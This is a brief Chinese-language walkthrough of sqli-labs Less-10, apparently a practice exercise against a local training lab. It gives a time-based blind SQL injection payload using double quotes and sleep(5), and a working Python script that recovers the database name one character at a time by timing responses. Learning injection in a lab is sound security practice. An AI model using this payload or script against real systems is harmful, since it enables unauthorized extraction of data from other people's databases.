payload：

?id=1"and+sleep(5)--+

五秒后返回。说明存在时间盲注。和第九关的区别就在于‘和“

```javascript
# coding=utf-8
# python3
# heibai
import requests

dic = "qwertyuioplkjhgfdsazxcvbnm0123456789,_@!#$%^&*()_+=<>?:\"|';/."
url = "http://127.0.0.1/vuln/sqli-labs/Less-10/?id=1\"+and+"
string = ''
for i in range(1, 100):
    for j in dic:
        id = "if(ascii(substr(database(),{0},1))={1},sleep(5),1)--+".format(i, ord(j))

        ctf = requests.get(url + id)
        time = ctf.elapsed.seconds
        if time > 3:
            string += j
            print(string)
            break
print(string)
```

